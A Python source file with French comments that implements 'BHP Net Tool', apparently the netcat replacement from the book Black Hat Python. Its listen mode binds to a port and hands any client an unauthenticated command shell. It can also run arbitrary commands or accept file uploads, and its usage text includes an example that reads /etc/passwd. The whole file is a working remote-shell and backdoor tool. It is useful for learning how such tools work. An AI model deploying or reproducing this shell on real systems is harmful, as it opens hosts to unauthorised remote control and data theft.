import argparse  # Module pour traiter les arguments de ligne de commande
import socket  # Module pour la gestion des sockets
import shlex  # Module pour le découpage de chaînes selon la syntaxe de la ligne de commande
import subprocess  # Module pour l'exécution de commandes externes
import sys  # Module pour les fonctionnalités système
import textwrap  # Module pour le formatage du texte
import threading  # Module pour la gestion des threads

# Fonction pour exécuter une commande shell et renvoyer la sortie
def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    # Exécute la commande shell et récupère la sortie
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    # Décodage de la sortie en format texte
    return output.decode()

# Classe principale pour le programme NetCat
class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Option pour réutiliser l'adresse et le port en cas de déconnexion
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        # Si l'option --listen est spécifiée, le programme est en mode écoute
        if self.args.listen:
            self.listen()
        else:
            # Sinon, le programme est en mode envoi
            self.send()

    def send(self):
        # Connexion au serveur cible
        self.socket.connect((self.args.target, self.args.port))
        # Si un tampon est spécifié, l'envoyer au serveur en premier
        if self.buffer:
            self.socket.send(self.buffer)

        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    # Recevoir les données du serveur
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break

                if response:
                    print(response)

                # Attendre la saisie utilisateur et envoyer les données au serveur
                buffer = input('> ')
                buffer += '\n'
                self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print('User terminated.')
            # Fermer la connexion en cas d'interruption manuelle
            self.socket.close()
            sys.exit()

    def listen(self):
        # Liaison du socket à l'adresse et au port spécifiés
        self.socket.bind((self.args.target, self.args.port))
        # Écoute des connexions entrantes avec une file d'attente maximale de 5
        self.socket.listen(5)

        while True:
            # Accepter la connexion du client
            client_socket, _ = self.socket.accept()
            # Créer un thread pour gérer la communication avec le client
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,)
            )
            client_thread.start()

    def handle(self, client_socket):
        # Si l'option --execute est spécifiée, exécuter la commande et envoyer la sortie au client
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        # Si l'option --upload est spécifiée, recevoir le fichier du client
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            # Écrire le fichier reçu sur le serveur
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())
        # Si l'option --command est spécifiée, exécuter une commande shell
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    # Envoyer un prompt au client
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        # Recevoir la commande du client
                        cmd_buffer += client_socket.recv(64)
                    # Exécuter la commande et envoyer la sortie au client
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    # Fermer la connexion en cas d'erreur
                    self.socket.close()
                    sys.exit()

# Programme principal
if __name__ == '__main__':
    # Configuration de l'analyseur d'arguments en ligne de commande
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
        netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
        netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
        netcat.py -t 192.168.1.108 -p 5555 -l -e="cat /etc/passwd" # execute command
        echo 'ABCDEFGHI' | ./netcat.py -t 192.168.1.108 -p 135 # echo local text to server port 135
        netcat.py -t 192.168.1.108 -p 5555 # connect to server
        '''
    ))
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()

    # Si l'option --listen est spécifiée, initialiser le tampon à une chaîne vide
    if args.listen:
        buffer = ''
    else:
        # Sinon, lire le tampon depuis l'entrée standard
        buffer = sys.stdin.read()

    # Création d'une instance de la classe NetCat et exécution du programme
    nc = NetCat(args, buffer.encode())
    nc.run()
